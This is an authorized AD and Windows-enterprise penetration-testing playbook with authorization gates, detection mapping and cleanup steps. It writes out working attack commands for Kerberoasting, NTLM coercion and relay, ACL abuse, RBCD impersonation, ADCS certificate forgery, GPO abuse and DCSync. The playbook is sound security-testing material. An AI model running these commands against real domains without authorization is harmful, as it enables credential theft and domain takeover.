# Active Directory & Windows Enterprise Testing Methodology

**Document type:** Repeatable assessment playbook (attack-surface taxonomy + tiering/governance + detection lens)
**Scope of applicability:** On-prem Active Directory, the Windows enterprise services that integrate with it (ADCS, GPO, MSSQL, SCCM, Exchange, WSUS, PKI), domain/forest trusts, and hybrid Entra ID identity — assessed from an authorized internal/assumed-breach position
**Relationship to other playbooks:** Use the **Internal/Assumed-Breach** methodology for the network engagement *lifecycle* (foothold → discovery → objective → cleanup). Use **this** document for the AD/Windows-enterprise *attack-surface taxonomy* and depth. They share folder, evidence, and finding-template conventions and are designed to run together.
**Standards referenced:** MITRE ATT&CK (Enterprise), Microsoft Tier 0/1/2 administrative model, CWE, CVSS v3.1/v4.0, NIST SP 800-115. Detection mappings to SIGMA/Windows event IDs where relevant.
**Toolchain assumed:** This Kali build — BloodHound CE + `bloodhound-python`/SharpHound, `netexec`, the impacket suite (incl. `secretsdump`, `GetUserSPNs`, `GetNPUsers`, `ntlmrelayx`, `dacledit`, `owneredit`, `rbcd`, `addcomputer`, `getST`, `ticketer`, `GetLAPSPassword`, `Get-GPPPassword`, `mssqlclient`), `certipy-ad`/`certi` (ADCS), `bloodyAD`, `rubeus`/`mimikatz` (windows-resources), `coercer`/`krbrelayx`, `responder`/`mitm6`, `mssqlpwner`, `azurehound`, `evil-winrm`, `ldapdomaindump`, `hashcat`/`john`, `peass-ng`. `pyGPOAbuse`/`SharpGPOAbuse`, `kerbrute`, `Certify`/`Certipy`-Windows, `sccmhunter`, `ROADtools`/`AADInternals`, `PingCastle` referenced where relevant (install / Windows-side / external).

> **Operating constraints baked into this methodology**
> - **Tier 0 is the organizing principle.** Identify Tier-0 assets (DCs, AD database, ADCS CA, GPO write, Entra Connect server, accounts/groups with domain-replication or schema rights) *first*; every attack path is scored by whether it reaches Tier 0, and every governance finding is "is this a Tier-0 privilege held by a non-Tier-0 principal?"
> - **Demonstrate paths; gate dominance and persistence.** DCSync-for-persistence, golden/silver/diamond tickets, krbtgt handling, DSRM, Skeleton Key, and durable GPO/ACL/cert persistence run **only** with explicit RoE — prefer proving the path over executing forest takeover.
> - **Enterprise = EDR.** AMSI, AppLocker, ASR, and EDR are in play. Agree up front whether this is **evasion** (red) or **detection validation** (purple); for purple, record the expected detection for each technique.
> - **Everything created is logged and reverted.** GPOs, computer accounts (RBCD), issued certificates, group memberships, ACL edits, tickets, and any persistence — tracked in a change log and cleaned up (Phase 12). Several of these techniques (GPO links at root, RBCD) have wide blast radius.
> - **DC stability + lockout discipline.** Avoid actions that risk DC availability; model lockout before any spraying; handle NTDS.dit/krbtgt with care.
> - Map every finding to **MITRE ATT&CK + CWE**, score against the tiering model, and (purple) note the detection opportunity. Separate evidence from hypothesis.

## 0. Phase 0 — Scoping & Engagement Model

**Goal:** Fix authorization, engagement type, the Tier-0 definition, and the detection/persistence rails.

### 0.1 Authorization & model — `00-scope/`
1. Signed authorization naming in-scope domains/forests, DCs, enterprise services, and (if hybrid) the Entra tenant, with ownership attestation.
2. **Engagement type:** red (evade), purple (validate detections collaboratively), or configuration/AD-security audit (largely read-only). Determines intrusiveness and what you record.
3. **Starting posture:** provided low-priv domain credential, foothold host, or on-network unauthenticated (see Internal/Assumed-Breach playbook for the lifecycle).
4. **Tier-0 definition (do this with the client):** enumerate what they consider Tier 0 — DCs, AD database, ADCS CA(s), GPO-write principals, Entra Connect/AD FS servers, backup systems with DC access, privileged groups. This becomes the scoring baseline.
5. **RoE intensity:** is exploitation/lateral movement/domain dominance permitted, or stop at path demonstration? Persistence allowed? Trust/cross-forest in scope? Hybrid/Entra in scope (and is the cloud provider's testing policy honored)?
6. **Detection posture:** evade vs validate; EDR/AMSI/AppLocker present; is the testing host allow-listed; blue-team contacts; should detections fire or be bypassed.
7. **Lockout policy** + spray budget; **DC-impact** escalation contact; emergency stop.

### 0.2 Decision point
- Audit-only / read-only RoE → run enumeration + attack-path *analysis* (Phases 1–9 mapping), no execution; report tiering violations and config drift.
- No persistence/dominance RoE → cap at path demonstration; do not execute golden tickets / durable persistence.

**Validation gate:** authorization stored; engagement type + Tier-0 list + detection posture + persistence RoE agreed; lockout budget set.

## 2. Phase 1 — Domain/Forest Recon & Tiering Assessment

**Goal:** Map the directory, trusts, and topology; assess the tiering model. MITRE ATT&CK: T1087, T1482, T1069.

### 2.1 Collection
```bash
bloodhound-python -u <user> -p '<pass>' -d <domain> -dc <DC-FQDN> -ns <DC-IP> -c All --zip
nxc ldap <DC> -u <user> -p '<pass>' --bloodhound --collection All --dns-server <DC-IP>
ldapdomaindump -u '<domain>\<user>' -p '<pass>' <DC> -o 01-recon/topology/
```

### 2.2 Topology & trusts
```bash
nxc ldap <DC> -u <user> -p '<pass>' --query "(objectClass=trustedDomain)" ""   # trusts
# Record: forest/domain functional level, DCs, FSMO roles, sites, trust directions/types, child domains.
```

### 2.3 Tiering assessment (the governance overlay)
From BloodHound, identify principals that hold **Tier-0 privileges**: domain-replication (DCSync) rights, GPO write on root/DC OUs, ACLs over the domain/AdminSDHolder, CA management, membership in Domain/Enterprise/Schema Admins, and write over Tier-0 computers. For each, record whether the holder is itself Tier 0 — any non-Tier-0 principal with a Tier-0 privilege is a finding.

Run the high-value queries: Shortest path to Domain/Enterprise Admins; Principals with DCSync; AS-REP/Kerberoastable with paths to high-value; ACL-abuse edges; delegation (unconstrained/constrained/RBCD); ADCS; AdminSDHolder-protected; OU/GPO structure; Tier-0 reachability.

**Validation gate:** topology + trust map + Tier-0 asset list in `01-recon/tiering/`; attack-path shortlist (Confirmed vs Candidate) drafted.

## 3. Phase 2 — Authentication & Credential-Exposure Surface

**Goal:** Enumerate every way credentials/tickets can be obtained. MITRE ATT&CK: T1558, T1003, T1557, T1552.

### 3.1 Kerberos roasting
```bash
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <DC-IP> -request -outputfile 02-credexposure/kerberoast.txt
impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <DC-IP> -outputfile 02-credexposure/asrep.txt
hashcat -m 13100 02-credexposure/kerberoast.txt wordlist.txt -r best64.rule
hashcat -m 18200 02-credexposure/asrep.txt wordlist.txt
```

### 3.2 NTLM exposure, coercion & relay
```bash
nxc smb <CIDR> --gen-relay-list 02-credexposure/no-signing.txt   # SMB signing not required
coercer coerce -u <user> -p '<pass>' -t <victim> -l <attacker>    # PetitPotam/PrinterBug
impacket-ntlmrelayx -tf 02-credexposure/no-signing.txt -smb2support
# LLMNR/IPv6 (disruptive — coordinate): responder -I eth0 -wv ; mitm6 -d <domain>
```

### 3.3 Stored/secret exposure
```bash
nxc smb <CIDR> -u <user> -p '<pass>' -M gpp_password            # GPP cpassword
nxc ldap <DC> -u <user> -p '<pass>' --gmsa                      # readable gMSA
impacket-GetLAPSPassword <domain>/<user>:'<pass>' -dc-ip <DC-IP>
```

### 3.4 Credential-dump surface (where admin/SYSTEM)
SAM/LSA (`secretsdump`/`nxc --sam --lsa`), LSASS (Mimikatz `sekurlsa::logonpasswords`; note EDR), DPAPI (`dploot`), **Internal Monologue** (NTLMv1 downgrade, LSASS-touch-free), NTDS.dit/DCSync (Phase 10, gated).

**Validation gate:** every credential-exposure avenue catalogued; obtained secrets recorded with source/type/account; cracked vs uncracked tracked.

## 4. Phase 3 — Privilege & ACL Attack Paths

**Goal:** Execute the ACL-abuse chains from Phase 1. MITRE ATT&CK: T1222, T1098. *These convert a single misconfigured ACE into escalation.*

| Edge | Abuse | Tooling |
|------|-------|---------|
| GenericAll / GenericWrite (user) | ForceChangePassword / targeted Kerberoast | `bloodyAD`, `dacledit` |
| GenericAll (group) | AddMember / AddSelf | `net rpc group addmem`, `bloodyAD` |
| GenericAll (computer) | RBCD / read LAPS | `rbcd`, `GetLAPSPassword` |
| GenericAll (domain) | grant DCSync / FullControl over descendants | `dacledit -rights FullControl` |
| WriteDACL / WriteOwner | take ownership → write DACL → control | `owneredit` + `dacledit` |
| ForceChangePassword | reset target's password (no current pwd) | `bloodyAD set password` |
| AddSelf | add self to a privileged group | `bloodyAD`, `net rpc` |
| DS-Replication rights | DCSync (Phase 10, gated) | `secretsdump -just-dc` |

```bash
# Examples
bloodyAD -u <user> -p '<pass>' -d <domain> --host <DC> set password <target> 'NewP@ss!'
impacket-dacledit -action write -rights FullControl -principal <you> -target <target> '<domain>/<user>:<pass>'
impacket-owneredit -action write -new-owner <you> -target <target> '<domain>/<user>:<pass>'
```
Check **AdminSDHolder** abuse and SDProp implications (durable rights over protected groups) — RoE-gated as it's persistence-adjacent.

**Validation gate:** each ACL path executed (or analysis-only per RoE) with captured proof; created memberships/ACLs in the change log; Tier-0 reachability updated.

## 5. Phase 4 — Kerberos Delegation

**Goal:** Abuse delegation to impersonate privileged principals / capture DC TGTs. MITRE ATT&CK: T1558.003.

### 5.1 Unconstrained
Compromise a host trusted for unconstrained delegation → coerce a DC to authenticate to it (printerbug/PetitPotam) → capture the DC TGT.
```bash
krbrelayx printerbug.py <domain>/<user>:'<pass>'@<victim-DC> <unconstrained-host>
# Monitor/capture the incoming TGT on the unconstrained host (Rubeus monitor / krbrelayx).
```

### 5.2 Constrained (S4U)
```bash
impacket-getST -spn <target-spn> -impersonate Administrator '<domain>/<svc-acct>' -hashes :<NTLM>
```

### 5.3 Resource-Based Constrained Delegation (RBCD)
```bash
impacket-addcomputer <domain>/<user>:'<pass>' -computer-name ATK$ -computer-pass 'P@ss!'
impacket-rbcd -delegate-from 'ATK$' -delegate-to '<target-computer$>' -action write '<domain>/<user>:<pass>'
impacket-getST -spn cifs/<target-fqdn> -impersonate Administrator '<domain>/ATK$:P@ss!'
```
Note bronze-bit (CVE-2020-17049) and delegation-hygiene findings (accounts trusted for delegation that shouldn't be).

**Validation gate:** delegation path proven with an impersonated service ticket / captured TGT; added computer accounts in the change log.

## 6. Phase 5 — Certificate Services (ADCS)

**Goal:** Identify and exploit ADCS misconfigurations (ESC1–ESC16). MITRE ATT&CK: T1649.

```bash
certipy-ad find -u <user>@<domain> -p '<pass>' -dc-ip <DC-IP> -stdout -vulnerable -o 05-adcs/find
```
Key paths:
- **ESC1:** vulnerable template (enrollee-supplies-subject + client-auth) → request cert as a privileged UPN.
- **ESC8:** NTLM relay to the CA web-enrollment endpoint (`ntlmrelayx -t http://<CA>/certsrv/...`) → cert for the relayed machine/DC.
- **ESC6/ESC9/ESC10/ESC11/ESC15/ESC16** and CA-config flaws → per Certipy output.
```bash
certipy-ad req -u <user>@<domain> -p '<pass>' -ca <CA> -template <vuln-template> -upn administrator@<domain>
certipy-ad auth -pfx administrator.pfx -dc-ip <DC-IP>     # cert -> TGT / NT hash
```
> Certificate-based **persistence** (long-lived cert that survives password resets) is RoE-gated and tracked for cleanup.

**Validation gate:** ADCS finding confirmed with an issued cert authenticating as a privileged principal (or analysis-only); issued certs logged for revocation/cleanup.

## 7. Phase 6 — Group Policy Attack Surface

**Goal:** Find and (RoE-permitting) abuse GPO write paths — a Tier-0 privilege that yields SYSTEM on every linked machine, DCs included. MITRE ATT&CK: T1484.001.

### 7.1 Audit
- Enumerate GPO DACLs for write rights held by non-privileged principals (BloodHound GPO edges; `Get-GPPermission` on Windows; PingCastle for ACL drift).
- Assess **link scope/blast radius:** GPOs linked at the domain root or Domain Controllers OU = functionally Domain Admin. Flag broad links.

### 7.2 Abuse (gated)
```bash
# pyGPOAbuse (Linux) — add a scheduled task / local admin via a writable GPO
pyGPOAbuse.py <domain>/<user>:'<pass>' -gpo-id <GPO-GUID> --command 'whoami' --taskname Update
# SharpGPOAbuse / StandIn on a Windows foothold are alternatives.
```
The mechanism is typically a Restricted Groups CSE or a Group Policy Preferences Scheduled Task written into SYSVOL → SYSTEM-context execution on linked hosts.

### 7.3 Detection expectation (purple)
Record what should fire: Directory Service Changes auditing (Event ID **5136**) on `gPCMachineExtensionNames`/`versionNumber`/`gPCFileSysPath`; SYSVOL FIM on `ScheduledTasks.xml`/`GptTmpl.inf`/`Groups.xml`/startup-logon scripts; tooling/behavioral tells (gpupdate preceding an unexpected task, mshta from a logon script, encoded PowerShell from Task Scheduler). Note whether the environment detected it.

**Validation gate:** GPO write paths enumerated with link-scope/blast-radius; any abuse proven minimally; **GPO/SYSVOL artifacts logged for removal**; detection outcome recorded.

## 8. Phase 7 — Enterprise Services in AD

**Goal:** Exploit Windows services integrated with AD. These are frequent Tier-0 shortcuts.

### 8.1 MSSQL in AD
```bash
nxc mssql <CIDR> -u <user> -p '<pass>'                          # discover instances + auth
impacket-mssqlclient <domain>/<user>:'<pass>'@<sql> -windows-auth
mssqlpwner <domain>/<user>:'<pass>'@<sql> -windows-auth interactive
```
- **UNC path injection** (`xp_dirtree`/`xp_fileexist` → NetNTLM capture/relay), **linked-server** traversal (`EXECUTE AT`, "follow the link"/"come home to me"), privilege escalation (`IMPERSONATE`), code execution (`xp_cmdshell`, CLR **custom assemblies**).

### 8.2 SCCM / MECM
- Network Access Account (NAA) credential recovery, PXE-boot media secrets, management-point relay, site-server takeover (`sccmhunter` — install). High-value: SCCM often holds broad admin.

### 8.3 Exchange / WSUS / PKI / shares
- Exchange: historical privesc and relay paths (e.g., to LDAP/ADCS); WSUS: update-injection where MITM is possible; standalone PKI; SYSVOL/file-share secrets (scripts, configs, keys).

**Validation gate:** each in-scope enterprise service enumerated; exploitable paths proven minimally; relay/coercion captures handled per data rules.

## 9. Phase 8 — Trusts & Forest/Cross-Forest

**Goal:** Move within and beyond the forest. MITRE ATT&CK: T1482, T1134.005.

### 9.1 Enumerate
Trust directions, types (parent-child, tree-root, external, forest), transitivity, and SID-filtering status (`08-trusts/`).

### 9.2 Intra-forest → forest takeover
- **ExtraSIDs / SID history:** from a child-domain compromise, forge a TGT with the Enterprise Admins SID to own the forest root ("owning the forest with Extra SIDs") — RoE-gated.
- **Printer/unconstrained across the trust** to capture a privileged TGT.

### 9.3 Cross-forest
- Foreign-principal access, trust-key abuse, linked SQL servers across forests, and enumeration beyond the forest. Respect SID filtering; document where it blocks vs allows the path.

**Validation gate:** trust map annotated with reachable paths; any cross-boundary escalation proven minimally and RoE-gated; forged tickets logged for cleanup.

## 10. Phase 9 — Hybrid Identity / Entra ID *(if in scope)*

**Goal:** Assess on-prem↔cloud identity bridges. MITRE ATT&CK: T1556, T1606. **Requires hybrid/cloud RoE + provider policy.**

### 10.1 Map the bridge
- **Entra Connect server is Tier 0** (on-prem). Identify sync method: Password Hash Sync (PHS), Pass-Through Auth (PTA), or federation (AD FS). Each has distinct abuse:
  - PHS: compromise the sync server → recover the `MSOL_`/sync account or hashes → cloud impact.
  - PTA: PTA-agent abuse to intercept/validate auth.
  - AD FS: token-signing key theft → **Golden SAML** (forge tokens for any user/role).

### 10.2 Cloud-side
```bash
azurehound -u <user> -p '<pass>' list -o 09-hybrid-entra/azurehound.json   # graph of Entra
# ROADtools / AADInternals (install) for tenant enum, PRT, app/consent abuse.
```
- Malicious app consent / OAuth grant abuse, Microsoft Graph over-permission, privileged role assignments, conditional-access gaps, on-prem→cloud (sync account) and cloud→on-prem (Intune/management) pivots.

**Validation gate:** hybrid bridge mapped; on-prem↔cloud pivot demonstrated minimally within RoE/provider policy; Tier-0 status of the sync/federation servers recorded.

## 11. Phase 10 — Domain/Forest Dominance & Persistence (Gated)

**Goal:** Demonstrate Tier-0 capability minimally; catalog persistence for detection. **All RoE-gated — prefer demonstration over execution.**

### 11.1 Dominance proof
```bash
impacket-secretsdump <domain>/<user>:'<pass>'@<DC> -just-dc-user <one-target>   # prove DCSync on ONE account
```
Demonstrate against a single high-value account; full NTDS/krbtgt extraction only with explicit authorization.

### 11.2 Persistence catalog (for purple/detection — execute only if RoE)
Golden/silver/diamond tickets, krbtgt abuse, DSRM, Skeleton Key, AdminSDHolder rights, durable GPO/ACL edits, certificate persistence, and SEC699-class host persistence (WMI event subscriptions, COM hijack, AppInit/AppCert/Netshell DLLs, Office add-ins/templates, ACT shims). For purple, the deliverable is the **detection opportunity** per technique, not durable footholds.

**Validation gate:** dominance demonstrated minimally; any persistence executed is logged and slated for removal; detection expectations recorded.

## 12. Phase 11 — Detection & Evasion Considerations (Purple Lens)

**Goal:** Tie each executed technique to a detection expectation; surface detection gaps as findings.

- For each technique used, record the **expected telemetry** (e.g., DCSync → DC replication from a non-DC source / Event 4662; Kerberoast → 4769 with RC4; GPO abuse → 5136 + SYSVOL change; LSASS access → 10/4656; AS-REP → 4768 with no pre-auth) and whether it was detected.
- Where the engagement is **red/evasion**, document which controls were bypassed (AMSI/AppLocker/ASR/EDR — PPID spoofing, cmdline spoofing, process injection/hollowing, direct syscalls) and that the *detection gap* itself is a finding.
- Output: a **detection-gap matrix** (technique → expected signal → observed?) in `11-detection/`, valuable to the blue team regardless of engagement type.

**Validation gate:** detection-gap matrix complete for executed techniques; gaps written up as findings.

## 13. Phase 12 — Cleanup & Deconfliction (Mandatory)

**Goal:** Return AD to its prior state and give defenders a complete change record.

From `12-cleanup/change-log/changes.md`, reverse every modification:
1. Delete added computer accounts (RBCD), group memberships, and ACL/owner edits (incl. AdminSDHolder).
2. Remove/unlink created GPOs and delete SYSVOL artifacts (ScheduledTasks.xml, Groups.xml, GptTmpl.inf entries, scripts).
3. Revoke issued certificates; remove any host persistence (WMI subs, COM, DLLs, shims, tasks, services).
4. Purge forged tickets and captured caches; document handling of cracked/recovered credentials and NTDS data per data rules.
5. Provide the blue team a timeline (source IPs, techniques, timestamps) for deconfliction.

**Validation gate:** every change-log entry has a corresponding revert with evidence; no test artifacts remain.

## 14. Phase 13 — Reporting

**Goal:** Deliver evidence-based findings, the foothold→Tier-0 narrative, tiering violations, and the detection-gap matrix.

### 14.1 Structure
1. Executive summary (could a foothold reach Tier 0 / forest dominance? key paths, root causes, tiering posture).
2. Scope, engagement type, RoE, detection posture, Tier-0 definition.
3. **Attack-path narrative** (foothold → … → Tier 0) with BloodHound-style graph + ATT&CK IDs.
4. Findings (ranked), template below.
5. Tiering & governance assessment (Tier-0 privileges held by non-Tier-0 principals).
6. Detection-gap matrix (purple value).
7. Evidence appendix; remediation roadmap (tiering, signing, LAPS, ADCS template hardening, GPO delegation, delegation hygiene, hybrid hardening).

### 14.2 Finding template
```markdown
### [Finding ID] <Title>

**Summary:** <Plain-language: what's weak and why it matters.>

**Affected component:** <object/account/template/GPO/CA/trust/sync-server, domain/forest>
**Attack surface / entry point:** <where in the path it's reached>
**Weakness classification:** <e.g., excessive ACL, ESC1, GPO DACL drift, unconstrained delegation, golden SAML exposure>
**Tiering impact:** <Tier-0 privilege held by Tier-? principal / crosses which boundary>
**MITRE ATT&CK:** <Txxxx(.xxx)>
**CWE mapping:** CWE-### <name>   (mark "uncertain" if not confidently mappable)
**CVSS:** <vector> → <score/severity>   (omit/mark "not scored" if unsupportable)

**Preconditions:** <Foothold/cred/position required.>

**Evidence:**
<Observed facts — command output, screenshots, BloodHound edges.
Reference 07-evidence/ artifacts by filename + hash.>

**Root cause:** <Underlying misconfig/design.>

**Impact:** <Concrete, evidence-bounded; note Tier-0 reachability. CONFIRMED vs INFERRED.>

**Exploitability:** <Reliability, preconditions, access. CONFIRMED vs INFERRED.>

**Detection:** <Expected telemetry (event IDs/SIGMA); was it observed? (purple)>

**Reproduction steps:**
1. <Exact commands, in order.>

**Expected vs. observed:**
- Expected (secure): <hardened behavior>
- Observed: <what AD allowed>

**Fix recommendation:** <Tiering, signing, template/delegation hardening, LAPS, least privilege, hybrid controls.>

**Validation after fix:** <Same check succeeds pre-fix, fails post-fix.>

**Residual risk:** <What remains; compensating controls.>
```

### 14.3 Quality checks
Each finding: evidence present; ATT&CK/CWE/tiering supportable or marked uncertain; reproduction validated; no invented edges/rights/CVEs; exec summary standalone; **change log fully reverted**; detection column populated for purple.

**Validation gate:** attack-path narrative + tiering assessment + detection-gap matrix complete; every finding links to hashed evidence; cleanup verified.

## 17. Appendix B — Attack-Path Quick References

## 19. Appendix D — Safety Cautions (AD/enterprise specific)
- **Tiering scoring:** every path is judged by Tier-0 reachability; every Tier-0 privilege on a non-Tier-0 principal is a finding.
- **Gating:** golden/silver/diamond tickets, krbtgt, DSRM, Skeleton Key, AdminSDHolder, durable GPO/ACL/cert persistence, forest takeover, full NTDS — explicit RoE only.
- **Blast radius:** GPO links at root/DC OU and RBCD edits affect many hosts — minimize, log, revert.
- **DC stability + lockout:** avoid DC-availability risk; model lockout; handle NTDS/krbtgt carefully.
- **Created objects:** computer accounts, GPOs/SYSVOL artifacts, certs, group members, tickets, persistence — change log + revert (Phase 12).
- **Detection posture:** evade vs validate agreed up front; for purple, record expected telemetry per technique.
- **Hybrid:** honor cloud-provider testing policy; treat Entra Connect/AD FS as Tier 0.
